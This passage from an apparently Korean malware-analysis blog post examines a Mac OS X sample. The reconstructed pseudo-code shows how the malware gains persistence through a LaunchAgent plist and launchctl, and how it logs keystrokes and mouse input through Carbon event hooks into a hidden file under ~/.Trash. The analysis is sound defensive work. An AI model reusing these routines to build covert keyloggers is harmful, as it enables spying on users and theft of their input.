	buf[fusion_builder_container hundred_percent="yes" overflow="visible"][fusion_builder_row][fusion_builder_column type="1_1" background_position="left top" background_color="" border_size="" border_color="" border_style="solid" spacing="yes" background_image="" background_repeat="no-repeat" padding="" margin_top="0px" margin_bottom="0px" class="" id="" animation_type="" animation_speed="0.3" animation_direction="left" hide_on_mobile="no" center_content="no" min_height="none"][strlen(buf)] = '/'; // $HOME/Library/LaunchAgents/

	strcat(buf, plistname); // $HOME/Library/LaunchAgents/mac.Dockset.deman

	buf[strlen(buf)] = '.pli';
	buf[strlen(buf)+4] = 'st';
	buf[strlen(buf)+6] = 0; // $HOME/Library/LaunchAgents/mac.Dockset.deman.plist

	unlink(buf); // 기존에 있던 파일을 삭제

	int fd = creat(buf, 600h);

	if (!fd)
		return;

	write(fd, '&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;?DOCTYPE plist PUBLIC "-/', nil);
	write(fd, '/Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/Pr
		opertyList-1.0.dtd"&gt; &lt;plist version="1.0"&gt; &lt;dict&gt; &lt;key&gt;Label&lt;/key&gt;&lt;string&gt;', nil);
	write(fd, plistname, strlen(plistname));
	write(fd, '&lt;/string&gt;&lt;key&gt;OnDemand&lt;/key&gt;&lt;false/&gt;&lt;key&gt;Program&lt;/key&gt;&lt;string&gt;', nil);
	write(fd, malware, strlen(malware));
	write(fd, '&lt;/string&gt; &lt;key&gt;ProgramArguments&lt;/key&gt; &lt;array&gt; &lt;string&gt;', nil);
	write(fd, arguments, strlen(arguments));
	write(fd, '&lt;/string&gt; &lt;/array&gt; &lt;/dict&gt; &lt;/plist&gt;', nil);

	close(fd); // plist 파일을 생성하고 핸들을 닫음.

	chmod(buf, 755o); // plist에 실행 권한을 줌.

	return;
}</pre>
<p>악성코드는 "$HOME/Library/LaunchAgents/" 디렉터리에 mac.Dockset.deman.plist 파일을 생성하고 그 안에 자동 실행을 위한 정보를 작성한다. 이 plist는 결국 다음과 같이 작성된다.</p>
<pre class="lang:default decode:true" title="SetAutoExecUserXML의 결과">&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt; &lt;plist version="1.0"&gt; &lt;dict&gt;
&lt;key&gt;Label&lt;/key&gt;
&lt;string&gt;mac.Dockset.deman&lt;/string&gt;
&lt;key&gt;OnDemand&lt;/key&gt;
&lt;false/&gt;
&lt;key&gt;Program&lt;/key&gt;
&lt;string&gt;/Users/tom/.Dockset&lt;/string&gt;
&lt;key&gt;ProgramArguments&lt;/key&gt;
&lt;array&gt;
&lt;string&gt;first&lt;/string&gt;
&lt;/array&gt; &lt;/dict&gt; &lt;/plist&gt;</pre>
<p>SetAutoExecUserXML 메서드가 완료되고 나면, DefaultInstall에서는 system API로 plist 정보를 이용하여 서비스 형태로 악성코드를 로드할 수 있도록 한다. 이는 자바 취약점으로 인해 생성된 프로세스는 분석 시, 비정상적인 부모를 가지고 있다보니 쉽게 발각될 수 있기 때문이다. 서비스 형태로 로드되는 경우에는 다른 일반 프로세스와 섞여 있을 수 있기 때문에 은닉성이 더 용이해진다.</p>
<pre class="lang:default decode:true">system("/bin/launchctl load ~/Library/LaunchAgents/mac.Dockset.deman.plist");</pre>
<p>이 임무가 끝나게되면, DefaultInstall 메서드가 종료된다. 최초 실행 시 악성코드는 이렇게 system API로 새로운 악성코드를 실행하고 자기자신은 종료된다. 새로운 프로세스는 launchctl에 의해 "~/.Dockset first" 형태로 실행된다. Part I에서 설명했다시피, first라는 인자가 있을 경우, ExeInstall::SetWorking이 실행된다. 이 함수는 특별한 임무를 수행하진 않고, 앞서 생성한 plist 파일의 arguments 필드의 값을 'first' -&gt; 'working'으로 변경한다. 이는 공격자가 악성코드의 진행 상황을 파악하기 위해 만든 것으로 추정된다.</p>
<p>&nbsp;</p>
<h2>2. 키로깅 기능 수행</h2>
<p>악성코드가 앞서 설명한 자동 실행 또는, launchctl load 명령으로 실행된 경우에는 RunKeyLoggerThread 를 스레드 형태로 실행(pthread_create)한다. 이 함수는 특별한 기능이 있는 것은 아니며, 단지 system API가 '~/.Dockset key'를 실행되도록 한다. 이렇게 새로 실행된 프로세스는 main 함수에서 RunKeyLogger 함수로 진입하게 된다.</p>
<p><a href="http://forensic.n0fate.com/wp-content/uploads/2014/01/keyloggerthread.jpg"><img class="aligncenter size-full wp-image-755" alt="keyloggerthread" src="{{ site.baseurl }}/assets/keyloggerthread.jpg" width="667" height="186" /></a></p>
<p>RunKeyLogger 함수가 실행되면, 실질적으로 키로깅에 대한 모든 기능을 수행하게 된다. 보통 악성코드는 키로깅을 위해 루트킷을 사용하는 것이 좀 더 일반적인 방법이지만, 루트 권한 상승을 위한 익스플로잇이 없는 상황이라면 다른 방법을 강구해봐야할 것이다. 윈도우의 경우에는 애플리케이션간 또는 사용자와의 통신에서 메시지가 사용된다는 점을 이용하여 사용자 레벨에서 키보드를 후킹하는 방법인 메시지 후킹(Message Hooking) 기법이 있다. Mac OS X에서는 메시지 대신 이벤트라는 명칭을 사용하며, EventHandler를 이용한 키보드 및 마우스 후킹을 수행할 수 있다. 이 악성코드도 이 방법을 이용하여 키보드 및 마우스 정보를 탈취한다.</p>
<p>RunKeyLogger 함수는 최초 실행 시점에 "$HOME/.Trash" 폴더를 생성하고 그 안에 ".tmp" 파일을 생성한다. "$HOME/.Trash' 폴더는 Mac OS X 사용자 디렉터리에 기본으로 있는 디렉터리로 Mac OS X의 휴지통 디렉터리이다. 윈도우의 "RecycleBin"과 같다고 보면 된다. 악성코드는 이 디렉터리에 숨김 파일을 만든다. 일반적인 사용자는 휴지통을 잘 보지도 않을 뿐더러, Finder는 숨김 파일보기가 기본적으로 꺼져있기 때문에 더더욱 확인하기 어렵다.</p>
<p><a href="http://forensic.n0fate.com/wp-content/uploads/2014/01/디렉터리-생성.jpg"><img class="aligncenter size-full wp-image-756" alt="디렉터리 생성" src="{{ site.baseurl }}/assets/&#46356;&#47113;&#53552;&#47532;-&#49373;&#49457;.jpg" width="540" height="238" /></a></p>
<p>디렉터리 생성이 완료되면, Gestalt 함수를 실행하고 그 결과를 0x102F보다 클 경우에만 키보드 후킹을 수행한다. getstalt는 Getstalt Manager라고하여, 애플리케이션이 동작하는 환경 정보를 가져오는 함수로 코어서비스(CoreService)에서 제공하고 있다. getstalt라는 함수에 인자로 전달하는‘sysv’는 System Version Selector로 Mac Developer Library에는 다음과 같이 설명하고 있다.</p>
<p><a href="http://forensic.n0fate.com/wp-content/uploads/2014/01/Image.png"><img class="aligncenter size-full wp-image-757" alt="system version selectors" src="{{ site.baseurl }}/assets/Image.png" width="1266" height="658" /></a></p>
<p>즉, getstalt 함수의 결과가 10.3(0x1030) 이상일 경우에만 정상 작동되도록 코드가 작성되어 있다. 이는 이벤트 모니터링 함수인 InstallEventHandler나 GetEventMonitorTarget가 <a href="https://developer.apple.com/legacy/library/documentation/Carbon/reference/Carbon_Event_Manager_Ref/Carbon_Event_Manager_Ref.pdf" target="_blank">카본 이벤트 매니저(Carbon Event Manager)</a>에 있는데 이 기능이 Mac OS X 10.3이상에서만 사용될 수 있기 때문으로 혹시 모를 에러를 최소화 하기 위한 조치로 보여진다.  이 부분을 지나면 이제 본격적으로 이벤트 핸들러를 등록한다. 개발자가 정의한 함수인 InstallMyEventHandler를 실행한 후, 핸들링할 이벤트 타입을 정의하는 AddEventTypeToHandler 함수를 실행한다. 마지막에 RunApplicationEventLoop 함수로 애플리케이션에서 발생하는 모든 이벤트를 핸들링할 수 있도록 한다.</p>
<p><a href="http://forensic.n0fate.com/wp-content/uploads/2014/01/installmyevent.png"><img class="aligncenter size-full wp-image-765" alt="installmyevent" src="{{ site.baseurl }}/assets/installmyevent.png" width="821" height="481" /></a></p>
<p>일단 사용자가 정의한 InstallMyEventHandler를 알아보기로 하겠다.</p>
<p>&nbsp;</p>
<h3>InstallMyEventHandler function</h3>
<p><!--?xml version="1.0" encoding="UTF-8" standalone="no"?--> 이 함수는 내부적으로 GetApplicationEventTarget으로 핸들링 대상을 설정하고, InstallEventHandler와 GetEventMonitorTarget을 이용하여 이벤트를 모니터링한다. xCode에보면 CarbonEvents.h에 이와 관련된 정보가 설정되어 있다.</p>
<p><a href="http://forensic.n0fate.com/wp-content/uploads/2014/01/InstallMyEvent_func.png"><img class="aligncenter size-full wp-image-766" alt="InstallMyEvent_func" src="{{ site.baseurl }}/assets/InstallMyEvent_func.png" width="931" height="484" /></a></p>
<p>C 코드로 표현하면 다음과 같다.</p>
<pre class="lang:objc decode:true" title="InstallMyEvent">InstallEventHandler(GetApplicationEventTarget();, CmdHandler, 1,  kEventClassCommand, NULL, &amp;fHandler); //
InstallEventHandler(GetEventMonitorTarget(), MonitorHandler, 1, kEventClassCommand, NULL, &amp;sHandler);
InstallEventHandler(GetApplicationEventTarget(), NewEventHandlerUPP(SuspendResumeHandler), 2, kEventClassApplication, NULL, NULL);</pre>
<p>GetApplicationEventTarget()는 특정 대상에서 이벤트를 전송하고 그에 대한 핸들러를 등록할 수 있다. 이 때 한가지 문가 발생할 수 있는데, 여러 이벤트가 동일한 이벤트 코드를 가질 수 있기 때문에 사용자 정의 핸들러에서 이를 구분 짓는데 문제가 발생할 수 있다는 점이다. 예를 들어, 마우스 클릭 이벤트(kEventMouseDown)와 앱 활성화 이벤트(kEventAppActivated)는 동일한 이벤트 값인 1을 가지기 때문에 미리 모니터링 타켓을 정해줘야 한다. 악성코드는 이 문제를 해결하기 위해 GetEventMonitorTarget 함수를 사용하였다.</p>
<p>두 번째 인자는 이벤트 발생 시 실행되는 핸들러로 GetApplicationEventTarget 함수에는 CmdHandler를, GetEventMonitorTarget 함수에는 MonitorHandler를 설정하였다.</p>
<p>네번째 인자는 cmds는 Command Events (HICommands), appl은 애플리케이션의 실행 종료 등의 이벤트를 말하는 Application-level Events이다.</p>
<p>사용자가 입력한 명령어를 핸들링 하는 CmdHandler는 전달된 이벤트에 따라 그에 맞는 Handler를 AddEventTypesToHandler() API로 추가한다.  다음은 CmdHandler에 대한 Pseudo-Code이다.<!--?xml version="1.0" encoding="UTF-8" standalone="no"?--></p>
<pre class="lang:objc decode:true" title="CmdHandler pseudo-code">int CmdHandler(int a1, EventRef theEvent)
{
	if (GetEventClass(theEvent) != kEventClassCommand)
	{
		if(gApplicationActive == 1 &amp;&amp; gProcessForegroundEvents == 1)
			return MonitorHandler(a1, theEvent);
		return 0;
	}

	GetEventParameter(theEvent, kEventParamDirectObject, kEventParamHICommand, 0, 14, 0, &amp;v5);

	UInt32 result = 0;
	UInt32 Code = 0;
	switch(items) {
		case kCmdMouseDown:
			result = kEventClassMouse;
			code = kEventMouseDown;
			break;
		case kCmdKeyModifiersChanged:
			result = kEventClassKeyboard;
			code = kEventRawKeyModifiersChanged;
			break;
		case kCmdForeground:
			gProcessForegroundEvents = GetControlValue(v7);
			break;
		case kCmdKeyDown:
			result = kEventClassKeyboard;
			code = kEventRawKeyDown;
			break;
		case kCmdKeyRepeat:
			result = kEventClassKeyboard;
			code = kEventRawKeyRepeat;
			break;
		case kCmdKeyUp:
			result = kEventClassKeyboard;
			code = kEventRawKeyRepeat;
			break;
		case kCmdMouseUp:
			result = kEventClassMouse;
			code = kEventMouseUp;
			break;
		case kCmdTabletPoint:
			result = kEventClassTablet;
			code = 1;
			break;
		case kCmdTabletProximity:
			result = kEventClassTablet;
			code = 3;
			break;
		case kCmdMouseWheel:
			result = kEventClassMouse;
			code = kEventMouseWheelMoved;
			break;
		default:
			return -1;

	}

	if(GetControlValue(v7))
	{
		OSStatus handler_status1 = AddEventTypesToHandler(sHandler, 1, &amp;result);
		OSStatus handler_status2 = AddEventTypesToHandler(fHandler, 1, &amp;result);

		if (handler_status1 != 0 || handler_status2 != 0)
		{
			// 에러 메시지출력
		}
		else
		{
			// 이벤트 타입 추가 완료 메시지 출력
		}

	}
	else
	{
		RemoveEventTypesFromHandler(sHandler, 1, &amp;result);
		RemoveEventTypesFromHandler(fHandler, 1, &amp;result);
	}
	return 0;
}</pre>
<p>AddEventTypesToHandler는 추가적인 핸들러를 등록하는 과정으로 예를 들어 kEventClassKeyboard 는 키보드 입력을 핸들링 한다는 의미가 된다. 즉 이 함수는 들어오는 커맨드 명령에 따라 새로운 이벤트 타입을 핸들러에 등록하는 역할을 한다.</p>
<p>MonitorHandler의 경우에는 GetEventClass를 통해 모니터링되는 이벤트의 클래스를 구분짓고 마우스와 키 입력 이벤트를 탈취하는 전형적인 키보드 후킹 방법을 사용한다.</p>
<pre class="lang:objc decode:true" title="monitorhandler">// Event Code
// Reference :http://sourcecodebrowser.com/sympy/0.5.8/plotting_2pyglet_2window_2carbon_2constants_8py_source.html
// https://developer.apple.com/legacy/library/documentation/Carbon/Conceptual/Carbon_Event_Manager/CarbonEvents.pdf

int MonitorHandler(int a1, EventRef theEvent)
{
	UInt32 eventClass = GetEventClass(theEvent);
	UInt32 result;
	if(eventClass == kEventClassMouse) // Mouse
	{
		if(GetEventKind(theEvent) == kEventMouseMoved) // 마우스가 이동하는 경우
			// 마우스의 현재 위치 정보를 가져옴
			GetEventParameter(theEvent, kEventParamMouseLocation, typeQDPoint, NULL, sizeof(result), NULL, &amp;result);
	}
	else
	{
		if(eventClass == kEventClassTablet) // tablet
		{
			GetEventKind(theEvent);
			return 0;
		}
		if(eventClass == kEventClassKeyboard) // keyboard
		{
			UInt32 eventKind = GetEventKind(theEvent);
			if(eventKind == kEventRawKeyRepeat) // 키가 반복되서 눌릴 경우(키보드를 누르고 있는 경우)
			{
				GetEventParameter(theEvent, kEventParamKeyCode, typeUInt32, NULL, sizeof(result), NULL, &amp;result);
				Virtual2Ascii(result, &amp;v7);
				return 0;
			}
			if(eventKind == kEventRawKeyDown) // 키가 눌린 경우
			{
				// 키 코드를 가져와서 ASCII 코드로 변환 후, 키로거 파일에 추가
				GetEventParameter(theEvent, kEventParamKeyCode, typeUInt32, NULL, sizeof(result), NULL, &amp;result);
				Virtual2Ascii(MonitorHandler::state, ..., &amp;v7);
				AppendKeyLogger(v7, 1);
				return 0;
			}
			if(eventKind == kEventRawKeyUp) // 키가 UP된 경우
			{
				GetEventParameter(theEvent, kEventParamKeyCode, typeUInt32, NULL, sizeof(result), NULL, &amp;result);
				Virtual2Ascii(result, &amp;v7);
				return 0;
			}
			if(eventKind == kEventRawKeyModifiersChanged) // 다른 키를 누르는 경우
			{
				GetEventParameter(theEvent, kEventParamKeyModifiers, typeUInt32, NULL, sizeof(result), NULL, &amp;result);
				MonitorHandler::state = v5;
			}

		}
	}
	return 0;
}</pre>
<p>이로 인해 공격자는 모든 키보드 입력과 마우스 입력을 탈취할 수 있다.</p>
<p>InstallMyEventHandler 함수가 완료되고 나면, AddEventTypeToHandler 함수로 키보드 입력 이벤트를 핸들링할 수 있도록 한다. 앞서 CmdHandler에서도 이 과정이 있음에도 한번 더 핸들러를 등록한다. 즉, 키보드 후킹은 들어오는 이벤트와 상관없이 무조건 데이터 탈취를 하겠다는 의미이다. 결국 키로거 함수의 기능을 코드로  표현하면 다음과 같이 정리할 수 있다.</p>
<pre class="lang:objc decode:true" title="RunKeyLogger">int RunKeyLogger()
{
	int status = API_lockfile("/var/tmp/48irfhjijwei4.lck");

	if (status)
	{
		strcpy(buf, getenv("HOME"));
		buf[strlen(buf)] += '/.Tr';
		buf[strlen(buf)] += 'ash';
		mkdir(buf, 777o);

		buf[strlen(buf)] += '/.tm';
		buf[strlen(buf)] += 'p'; // buf = '$HOME/.Trash/.tmp';

		Gestalt('sysv', tmp);
		if(tmp &lt;= 0x102F) // Mac OS X 10.3 이하
		{
			return -1;
		}
		else
		{
			InstallEventHandlers(); // 커맨드 핸들러로 핸들링할 이벤트를 선정하고, 모니터 핸들러로 키보드 및 마우스 입력을 탈취
			AddEventTypesToHandler(sHandler, 1, kEventClassKeyboard|kEventRawKeyDown); // 키보드 입력 이벤트
			AddEventTypesToHandler(fHandler, 1, kEventClassKeyboard|kEventRawKeyDown);
			AddEventTypesToHandler(sHandler, 1, kEventClassKeyboard|kEventRawKeyModifiersChanged); // 다른 키 입력 이벤트
			AddEventTypesToHandler(fHandler, 1, kEventClassKeyboard|kEventRawKeyModifiersChanged);
		}

	}
}</pre>
<p>일단 이정도로 자동실행 등록 및 키로깅 기능을 알아보았다. part III에서는 감염 시스템 제어를 위한 C2(command and control) 기능을 분석해보겠다.</p>
<p>&nbsp;</p>
<p>&nbsp;[/fusion_builder_column][/fusion_builder_row][/fusion_builder_container]</p>
